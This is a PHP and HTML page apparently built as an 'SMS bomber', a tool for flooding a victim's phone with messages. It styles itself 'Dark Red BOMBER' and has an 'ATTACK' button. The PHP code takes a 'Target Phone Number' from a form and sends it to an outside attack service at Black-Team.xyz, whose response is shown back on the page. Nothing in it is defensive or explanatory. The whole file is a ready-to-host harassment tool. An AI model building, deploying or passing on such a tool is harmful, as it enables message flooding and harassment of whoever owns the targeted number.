<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $phone = $_POST['phone'];

    // Ensure the input is sanitized
    $phone = htmlspecialchars(strip_tags($phone));

    // Set a fixed amount
    $amount = 20;

    // Construct the API URL
    $apiUrl = "http://Black-Team.xyz/sms/danger.php?phone=$phone";

    // Make the API request
    $response = @file_get_contents($apiUrl);
    
    // Check if the response is valid
    if ($response === FALSE) {
        $response = "Error: Unable to contact API.";
    } else {
        // Prepare the response with the amount
        $response .= " | Amount: " . htmlspecialchars($amount);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dark Red BOMBER</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Nosifer&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');

        body {
            background: url('https://64.media.tumblr.com/bfdb2e75c8df36dcc9cb424afb3829a2/0727fe47787d0a0c-d8/s540x810/a76a693c4af7bde413ba288614b116899fcf5dfb.gif') no-repeat center center fixed;
            background-size: cover;
            color: #39FF14;
            font-family: 'VT323', monospace;
            text-align: center;
            padding: 50px 0;
            margin: 0;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            border: 2px solid #39FF14;
            padding: 30px;
            background: rgba(0, 0, 0, 0.85);
            box-shadow: 0 0 15px #39FF14;
            animation: glow 1.5s infinite alternate;
        }

        h1 {
            font-size: 3em;
            color: #ff0000;
            text-shadow: 2px 2px 10px #39FF14;
            margin-bottom: 20px;
            animation: flicker 2s infinite alternate;
        }

        input, button {
            padding: 15px;
            font-size: 1.2em;
            margin: 10px 0;
            border: 1px solid #39FF14;
            background: #1a1a1a;
            color: #39FF14;
            box-shadow: 0 0 5px #39FF14;
            width: 90%;
            outline: none;
        }

        input::placeholder {
            color: #ff0000;
            opacity: 0.7;
            font-style: italic;
        }

        #submitButton {
            background-color: #ff0000;
            color: white;
            cursor: pointer;
            transition: background 0.3s;
            animation: glow 1.5s infinite alternate;
        }

        #submitButton:hover {
            background-color: #ff3333;
        }

        .stats {
            margin-top: 20px;
            font-size: 1.5em;
            color: #39FF14;
            animation: flicker 1.5s infinite alternate;
        }

        .credit {
            font-size: 1.2em;
            color: #ff0000;
            margin-top: 50px;
        }

        .credit a {
            color: #39FF14;
            text-decoration: none;
            animation: flicker 1.5s infinite alternate;
        }

        @keyframes flicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        @keyframes glow {
            0% { box-shadow: 0 0 10px #39FF14; }
            100% { box-shadow: 0 0 20px #39FF14, 0 0 30px #ff0000; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DARK RED BOOM</h1>
        <form method="POST">
            <input type="text" name="phone" placeholder="⚠️ Enter Target Phone Number ⚠️" required>
            <button type="submit" id="submitButton">ATTACK ⚠️</button>
        </form>
        <div class="stats">
            <?php
            if (isset($response)) {
                echo "Response: " . htmlspecialchars($response);
            }
            ?>
        </div>
        <div class="credit">Created by <a href="https://t.me/BLACKCYBERADMIN">—͟͞͞乂 𝘽𝙇𝘼𝘾𝙆 𝙒𝙊𝙇𝙁 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭</a></div>
    </div>
</body>
</html>

